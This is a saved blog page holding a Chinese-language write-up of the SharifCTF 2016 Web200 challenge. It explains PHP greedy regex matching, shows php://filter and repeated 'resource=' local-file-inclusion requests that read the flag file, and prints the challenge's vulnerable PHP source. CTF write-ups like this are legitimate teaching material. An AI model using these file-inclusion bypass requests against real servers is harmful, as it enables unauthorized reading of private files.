@@ -1,0 +1,413 @@
+<!DOCTYPE HTML>
+
+<html>
+<head>
+<meta charset="utf-8"/>
+<meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"/>
+<meta content="yes" name="apple-mobile-web-app-capable">
+<title>SharifCTF Web200 wp - Veneno's Blog</title>
+<link href="./SharifCTF Web200 wp - Veneno's Blog/highslide.css" rel="stylesheet" type="text/css"/>
+<!--[if lt IE 7]>
+<link rel="stylesheet" type="text/css" href="http://www.venenof.com/usr/plugins/HighSlide/css/highslide-ie6.css" />
+<![endif]-->
+<meta content="因为快过年了当是觉得是LFI就没细看，今天上官网一看环境还没关，于是就做了下，当然其中也有些坑，就写一下正规的做法0x00.关于php的正则贪婪匹配原则：在可配也可不配的情况下, 优先匹配，直到..." name="description">
+<meta content="贪婪匹配,lfi" name="keywords"/>
+<script type="text/javascript">
+(function () {
+    window.TypechoComment = {
+        dom : function (id) {
+            return document.getElementById(id);
+        },
+    
+        create : function (tag, attr) {
+            var el = document.createElement(tag);
+        
+            for (var key in attr) {
+                el.setAttribute(key, attr[key]);
+            }
+        
+            return el;
+        },
+
+        reply : function (cid, coid) {
+            var comment = this.dom(cid), parent = comment.parentNode,
+                response = this.dom('respond-post-36'), input = this.dom('comment-parent'),
+                form = 'form' == response.tagName ? response : response.getElementsByTagName('form')[0],
+                textarea = response.getElementsByTagName('textarea')[0];
+
+            if (null == input) {
+                input = this.create('input', {
+                    'type' : 'hidden',
+                    'name' : 'parent',
+                    'id'   : 'comment-parent'
+                });
+
+                form.appendChild(input);
+            }
+
+            input.setAttribute('value', coid);
+
+            if (null == this.dom('comment-form-place-holder')) {
+                var holder = this.create('div', {
+                    'id' : 'comment-form-place-holder'
+                });
+
+                response.parentNode.insertBefore(holder, response);
+            }
+
+            comment.appendChild(response);
+            this.dom('cancel-comment-reply-link').style.display = '';
+
+            if (null != textarea && 'text' == textarea.name) {
+                textarea.focus();
+            }
+
+            return false;
+        },
+
+        cancelReply : function () {
+            var response = this.dom('respond-post-36'),
+            holder = this.dom('comment-form-place-holder'), input = this.dom('comment-parent');
+
+            if (null != input) {
+                input.parentNode.removeChild(input);
+            }
+
+            if (null == holder) {
+                return true;
+            }
+
+            this.dom('cancel-comment-reply-link').style.display = 'none';
+            holder.parentNode.insertBefore(response, holder);
+            return false;
+        }
+    };
+})();
+</script>
+<script type="text/javascript">
+(function () {
+    var event = document.addEventListener ? {
+        add: 'addEventListener',
+        focus: 'focus',
+        load: 'DOMContentLoaded'
+    } : {
+        add: 'attachEvent',
+        focus: 'onfocus',
+        load: 'onload'
+    };
+
+    document[event.add](event.load, function () {
+        var r = document.getElementById('respond-post-36');
+
+        if (null != r) {
+            var forms = r.getElementsByTagName('form');
+            if (forms.length > 0) {
+                var f = forms[0], textarea = f.getElementsByTagName('textarea')[0], added = false;
+
+                if (null != textarea && 'text' == textarea.name) {
+                    textarea[event.add](event.focus, function () {
+                        if (!added) {
+                            var input = document.createElement('input');
+                            input.type = 'hidden';
+                            input.name = '_';
+                            input.value = (function () {
+    var _L4blM = 'jqr'//'jqr'
++'ff6'//'795'
++//'f'
+'db'+'d7'//'9'
++//'HRC'
+'f'+'9'//'9'
++//'Nm'
+'d67'+'y'//'y'
++'7'//'1F'
++//'F'
+'754'+'LUE'//'LUE'
++//'Ca'
+'a9'+'9'//'wK'
++//'GH8'
+'8'+'41a'//'vAP'
++'32c'//'JS'
++//'l'
+'5'+'444'//'p4'
++//'Lo'
+'78'+/* 'd'//'d' */''+//'0p'
+'6', _FZt = [[0,3],[8,9],[11,12],[15,18]];
+    
+    for (var i = 0; i < _FZt.length; i ++) {
+        _L4blM = _L4blM.substring(0, _FZt[i][0]) + _L4blM.substring(_FZt[i][1]);
+    }
+
+    return _L4blM;
+})();
+
+                            f.appendChild(input);
+                            added = true;
+                        }
+                    });
+                }
+            }
+        }
+    });
+})();
+</script><link href="./SharifCTF Web200 wp - Veneno's Blog/style.css" rel="stylesheet"/>
+<link href="./SharifCTF Web200 wp - Veneno's Blog/prism.css" rel="stylesheet"/>
+<link href="./SharifCTF Web200 wp - Veneno's Blog/iconfont.css" rel="stylesheet"/>
+<link href="./SharifCTF Web200 wp - Veneno's Blog/player.css" rel="stylesheet"/>
+<link href="" rel="shortcut icon"/>
+</meta></meta></head>
+<body>
+<header>
+<div class="main">
+<div class="intro"> <img class="intro-logo" src="./SharifCTF Web200 wp - Veneno's Blog/veneno.jpeg"/> <span class="intro-sitename"><a href="http://www.venenof.com/">
+      Veneno's Blog      </a></span> <span class="intro-siteinfo">
+      The harder you struggle today,the more glorious you will be tomorrow.      </span> <span class="social"> <a href="" target="_blank"><i class="iconfont icon-qq"></i></a> <a href="" target="_blank"><i class="iconfont icon-mail"></i></a> <a href="" target="_blank"><i class="iconfont icon-weibo"></i></a> <a href="" target="_blank"><i class="iconfont icon-github"></i></a> </span> </div>
+<nav>
+<div class="collapse">
+<i class="iconfont icon-menu"></i></div>
+<ul class="bar">
+<li><a href="http://www.venenof.com/">首页</a></li>
+<li><a href="http://www.venenof.com/index.php/archive.html">
+          时间          </a></li>
+<li><a href="http://www.venenof.com/index.php/link.html">
+          友链          </a></li>
+<li><a href="http://www.venenof.com/index.php/Veneno.html">
+          About Me          </a></li>
+</ul>
+</nav>
+<a class="icon-search" id="btnChange" onclick="searchbox();"></a>
+<div id="search" style="display:none">
+<div class="icon-close" onclick="searchbox();"></div>
+<form action="/index.php" class="search" id="searchform" method="get" name="form">
+<input autofocus="autofocus" id="searchText" name="s" placeholder="输入关键字查找" style="margin-top:25%" type="search"/>
+</form>
+</div>
+</div></header><content>
+<div class="main">
+<div class="article">
+<div class="article-title">SharifCTF Web200 wp</div>
+<small class="article-time">发表于： <time datetime="2016-02-07T23:27:00+00:00" itemprop="datePublished">2016-02-07</time> | 分类： <a href="http://www.venenof.com/index.php/category/CTF/">CTF</a> | <a href="http://www.venenof.com/index.php/archives/36/#comments" itemprop="discussionUrl">评论：3 </a> | 阅读：269</small>
+<div class="article-content">
+<p>因为快过年了当是觉得是LFI就没细看，今天上官网一看环境还没关，于是就做了下，当然其中也有些坑，就写一下正规的做法</p>
+<hr/>
+<h2>0x00.关于php的正则贪婪匹配原则：</h2>
+<p>在可配也可不配的情况下, 优先匹配，直到不能匹配成功的情况下，记录备选状态，并把匹配控制交给正则表达式的下一个匹配字符，当之后的匹配失败的时候，再回溯，进行匹配。简单来说就是首次匹配的长度尽可能地长。</p>
+<hr/>
+<h2>0x01.首先看下源码：</h2>
+<p><img alt="QQ截图20160207224011.jpg" src="./SharifCTF Web200 wp - Veneno's Blog/2493615784.jpg"/><br/>
+发现是可以去访问的，然后就试着利用php://filter看看能不能出来源码</p>
+<pre><code>ctf.com/images?id=php://filter/read=convert.base64-encode/resource=files/images/heart.jpg
+</code></pre>
+<p>结果当然没出来，尴尬= =，发现出来的还是图片，看了国外大神的wp一眼，果真还是见得少，应该是利用了preg_match进行正则过滤，根据回显依然是图片，猜测是</p>
+<pre><code>^php://.*resource=(.*)$这种形式
+</code></pre>
+<!--more-->
+<hr/>
+<h2>0x02.绕过正则：</h2>
+<p>可以看到</p>
+<pre><code>^php://.*resource=(.*)$
+</code></pre>
+<p>这样的话，我们需要让他匹配到flag那个目录，那么根据这个正则。<br/>
+我们一开始访问的是:</p>
+<pre><code>ctf.com/images.php?id=files/images/heart.jpg
+</code></pre>
+<p>我们想要访问的是：</p>
+<pre><code>ctf.com/images.php?id=files/flag/flag.txt
+</code></pre>
+<p>但是如果直接这样访问的时候，会提示file not found，猜测不是不存在，可能是存在一些文件名判断，所以利用贪婪匹配：</p>
+<pre><code>ctf.com/images.php?id=php://filter/read=convert.base64-encode/resource=files/images/heart.jpg/resource=files/flag/flag.txt
+</code></pre>
+<p>实际上我们访问的就是：</p>
+<pre><code>ctf.com/images.php?id=files/flag/flag.txt
+</code></pre>
+<p>就这样拿到了flag：<br/>
+<img alt="QQ截图20160207232426.jpg" src="./SharifCTF Web200 wp - Veneno's Blog/3755879064.jpg"/><br/>
+然后顺便读下源码：<br/>
+<img alt="QQ截图20160207232644.jpg" src="./SharifCTF Web200 wp - Veneno's Blog/3867568884.jpg"/><br/>
+有兴趣的朋友可以自己构建下环境，附上源码：</p>
+<pre><code>&lt;?php
+//if (extract_teamname_from_cookie("technews") === false)
+//    exit;
+
+if(isset($_GET["id"]) &amp;&amp;  (strpos($_GET["id"],'jpg') !== false))//is file type is jpg?
+{
+#  echo "$_GET["id"]";
+  
+  header('Cache-control: private');
+
+    preg_match("/^php:\/\/.*resource=([^|]*)/i", trim($_GET["id"]), $matches);
+//die ("&lt;pre&gt;" . trim($_GET["id"]));
+//die ("&lt;pre&gt;///".print_r($matches, true)."///");
+    if (isset($matches[1]))
+        $_GET["id"] = $matches[1];
+
+    if (file_exists("./" . $_GET["id"]) == false)
+        die("file not found");
+    if (substr(realpath("./" . $_GET["id"]), 0, 24) != "/var/www/technology-news")
+        die(".");
+
+    header('Content-Type: image/jpg');
+    header('Content-Length: '.filesize($_GET["id"]));
+    header('Content-Disposition: filename='.$_GET["id"]);
+
+    $img_data = file_get_contents($_GET["id"]);
+    $img_data = sharifctf_internal_put_it($img_data, "technews");
+    echo $img_data;
+  
+}
+else //file type is not jpg! show the error message
+{
+    echo "file not found";
+}
+?&gt;
+</code></pre>
+<hr/>
+<h2>最后祝大家新年快乐~:)</h2>
+</div>
+<div class="post-footer">
+<div class=" post-tags">
+<div class="tag"> 标签: <a href="http://www.venenof.com/index.php/tag/%E8%B4%AA%E5%A9%AA%E5%8C%B9%E9%85%8D/">贪婪匹配</a>, <a href="http://www.venenof.com/index.php/tag/lfi/">lfi</a></div>
+<div class="post-nav">
+<li class="prev"><a href="http://www.venenof.com/index.php/archives/33/" title="一款Ubuntu主题">一款Ubuntu主题</a></li>
+<li class="next">
+<a href="http://www.venenof.com/index.php/archives/48/" title="IW CTF 2016 Web两道 writeup">IW CTF 2016 Web两道 writeup</a></li>
+</div>
+</div>
+</div>
+</div></div></content>
+<div id="comments">
+<!-- Duoshuo Comment BEGIN -->
+<div class="ds-thread" data-author-key="1" data-thread-key="36" data-title="SharifCTF Web200 wp" data-url=""></div>
+<script type="text/javascript">
+	var duoshuoQuery = {short_name:"veneno1",theme:"dark"};
+	(function() {
+		var ds = document.createElement("script");
+		ds.type = "text/javascript";ds.async = true;
+		ds.src = "http://static.duoshuo.com/embed.js";
+		ds.charset = "UTF-8";
+		(document.getElementsByTagName("head")[0] 
+		|| document.getElementsByTagName("body")[0]).appendChild(ds);
+	})();
+	</script>
+<!-- Duoshuo Comment END -->
+</div>
+</body></html>
+﻿<div class="willerce">
+<div> </div>
+<!--播放器 -->
+<div id="QPlayer">
+<div id="pContent">
+<div id="player"> <span class="cover"></span>
+<div class="ctrl">
+<div class="musicTag marquee"> <strong>Title</strong> <span> - </span> <span class="artist">Artist</span> </div>
+<div class="progress">
+<div class="timer left">0:00</div>
+<div class="contr">
+<div class="rewind icon"></div>
+<div class="playback icon"></div>
+<div class="fastforward icon"></div>
+</div>
+<div class="right">
+<div class="liebiao icon"></div>
+</div>
+</div>
+</div>
+</div>
+<div class="ssBtn">
+<div class="adf"></div>
+</div>
+</div>
+<ol id="playlist">
+</ol>
+</div>
+<script src="./SharifCTF Web200 wp - Veneno's Blog/jquery.min.js"></script>
+<script src="./SharifCTF Web200 wp - Veneno's Blog/jquery.marquee.min.js"></script>
+<script>
+	var	playlist = [	
+];
+  var isRotate = 1;
+  var autoplay = ;  
+</script>
+<script src="./SharifCTF Web200 wp - Veneno's Blog/player.js"></script>
+<script>
+function bgChange(){
+	var lis= $('.lib');
+	for(var i=0; i<lis.length; i+=2)
+	lis[i].style.background = 'rgba(246, 246, 246, 0.5)';
+}
+window.onload = bgChange;
+</script>
+<!--<div class="qrcode">
+  <img src="" width="126" height="136" alt=""> </div>-->
+<footer>
+<p> <a href="" target="_blank">网站地图</a><br/>
+Copyright © 2015-2017 <a href="http://www.venenof.com/">
+    Veneno's Blog    
+<script src="./SharifCTF Web200 wp - Veneno's Blog/highslide.packed.js" type="text/javascript"></script>
+<script type="text/javascript">
+//<![CDATA[
+hs.graphicsDir = "http://www.venenof.com/usr/plugins/HighSlide/css/graphics/";
+hs.fadeInOut = true;
+hs.transitions = ["expand","crossfade"];
+hs.lang.creditsText = "&copy; www.venenof.com";
+hs.lang.creditsTitle = "&copy; www.venenof.com";
+hs.creditsHref = "http://www.venenof.com/index.php";
+hs.creditsPosition = "top left";
+hs.lang={
+loadingText : "载入中...",
+loadingTitle : "取消",
+closeText : "关闭",
+closeTitle : "关闭 (Esc)",
+previousText : "上一张",
+previousTitle : "上一张 (←键)",
+nextText : "下一张",
+nextTitle : "下一张 (→键)",
+moveTitle : "移动",
+moveText : "移动",
+playText : "播放",
+playTitle : "幻灯播放 (空格键)",
+pauseText : "暂停",
+pauseTitle : "幻灯暂停 (空格键)",
+number : "第%1张 共%2张",
+restoreTitle :	"点击关闭或拖动. 左右方向键切换图片. ",
+fullExpandTitle : "完整尺寸",
+fullExpandText :  "原大"
+};
+//]]>
+</script>
+<script>
+document.body.addEventListener('copy', function (e) {
+    if (window.getSelection().toString() && window.getSelection().toString().length > 10) {
+        setClipboardText(e);
+    }
+}); 
+function setClipboardText(event) {
+    var clipboardData = event.clipboardData || window.clipboardData;
+    if (clipboardData) {
+        event.preventDefault();
+        var htmlData = ''
+            + '著作权归作者所有。<br>'
+            + '商业转载请联系作者获得授权，非商业转载请注明出处。<br>'
+            + '作者：Veneno<br>'
+            + '链接：' + window.location.href + '<br>'
+            + '来源：http://www.venenof.com/<br><br>'
+            + window.getSelection().toString();
+        var textData = ''
+            + '著作权归作者所有。\n'
+            + '商业转载请联系作者获得授权，非商业转载请注明出处。\n'
+            + '作者：Veneno\n'
+            + '链接：' + window.location.href + '\n'
+            + '来源：http://www.venenof.com/\n\n'
+            + window.getSelection().toString();
+        clipboardData.setData('text/html', htmlData);
+        clipboardData.setData('text/plain',textData);
+    }
+}
+</script>
+</a></p></footer>
+<div class="toTop">TOP</div>
+<script src="./SharifCTF Web200 wp - Veneno's Blog/all.js"></script>
+<script src="./SharifCTF Web200 wp - Veneno's Blog/jquery.js"></script>
+<script src="./SharifCTF Web200 wp - Veneno's Blog/prism.js"></script>
+<script src="./SharifCTF Web200 wp - Veneno's Blog/search.js"></script>
+</div>
+
